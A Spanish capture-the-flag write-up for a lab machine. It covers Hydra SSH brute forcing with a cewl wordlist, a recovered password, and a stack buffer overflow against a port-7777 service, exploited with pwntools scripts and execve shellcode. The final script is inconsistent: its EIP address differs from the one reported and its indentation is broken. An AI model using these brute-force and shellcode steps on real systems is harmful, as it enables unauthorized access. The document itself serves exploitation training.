## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un ejecutable llamado sender para descargar.

```bash
chmod +x sender
./sender
```

Info:

```bash
Uso: ./sender <IP> <PUERTO>
```

SI abro un servidor con Python y me envío algo funciona pero no sirve de mucho.

Después de un rato investigando veo 3 usuarios en la web:

```bash
juan
marta
alex
```

Pruebo crear un diccionario con las palabras de la página utilizando Cewl para luego probar un ataque con Hydra ya que hay SSH:

```bash
cewl http://172.17.0.2/ -w dic.txt
```

```bash
hydra -L users.txt -P dic.txt ssh://172.17.0.2 -t 64
```

Encuentro:

```bash
alex:emfUa
```

## Escalada

Dentro del directorio /home/alex hay un binario llamado server:

```bash
./server
Servidor escuchando en el puerto 7777...
```

Por lo que de una pruebo enviar un Buffer Overflow desde el binario sender:

```bash
Servidor escuchando en el puerto 7777...
Conexión aceptada de 172.17.0.1:35152
Datos recibidos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Procesado: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Segmentation fault
```

Confirmo la vulnerabilidad.

Antes reviso las protecciones:

```bash
❯ checksec --file=./server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   51 Symbols	 No	0		4		./server
❯ 
```

Para esto me apoye en el WriteUp de Maciferna que está en la misma página.

Primero creamos un script en Python para automatizar el proceso:

```bash
#!/usr/bin/env python3
from pwn import *

def exploit():
    host='172.17.0.2'
    port='7777'
    pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    payload = pattern
    p = remote(host, port)
    p.sendline(payload)
    p.close()
    
if __name__ == '__main__':
    exploit()
```

Desde el servidor victima abro gdb:

```bash
gdb -q ./server
r
```

Y desde el host ejecuto el script:

```bash
python3 exploit.py
```

Detectamos que la aplicación es de 32 bytes y que el EIP está en la dirección de memoria 0x63413563. Así que utilizo Metasploit para calcular el offset:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
# Info:
[*] Exact match at offset 76
```

Ahora se modifica el script:

```bash
#!/usr/bin/env python3
from pwn import *

def exploit():
    host='172.17.0.2'
    port='7777'
  
    offset = 76
  
    buf = b"A"*offset
    eip = b"B"*4
    payload = buf + eip
    p = remote(host, port)
    p.sendline(payload)
    p.close()
    
if __name__ == '__main__':
    exploit()
```

Con esto tomaremos control del EIP:

```bash
EIP  0x42424242
```

Sabiendo que no tiene protecciones podemos ejecutar una shellcode en la pila:

```bash
    shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
    shellcode += b"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
    shellcode += b"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
    shellcode += b"\x51\x53\x89\xe1\xcd\x80"
```

Hay que modificar el valor del offset a 43 ya que es el resultado de 76 - el valor de la shellcode y reemplazando las 'A' por nops para que la shellcode sea interpretada correctamente.

Para saber a que dirección apuntar con el EIP ejecuto en gdb:

```bash
x/200wx $esp
```

En mi caso fué “0xffffcdd0”.

Ahora actualizó el script:

```bash
#!/usr/bin/env python3
from pwn import *

def exploit():
    host='172.17.0.2'
    port='7777'
    
    offset = 43
    nops = b"\x90"*offset
    eip = p32(0xffffd310)
		
		shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
    shellcode += b"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
    shellcode += b"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
    shellcode += b"\x51\x53\x89\xe1\xcd\x80"
		
		payload = nops + shellcode + eip
    p = remote(host, port)
    p.sendline(payload)
    p.close()

if __name__ == '__main__':
    exploit()
```

Ejecuto ./sender fuera de gdb, luego el script y debería devolver una bash con privilegios root.

Listo.
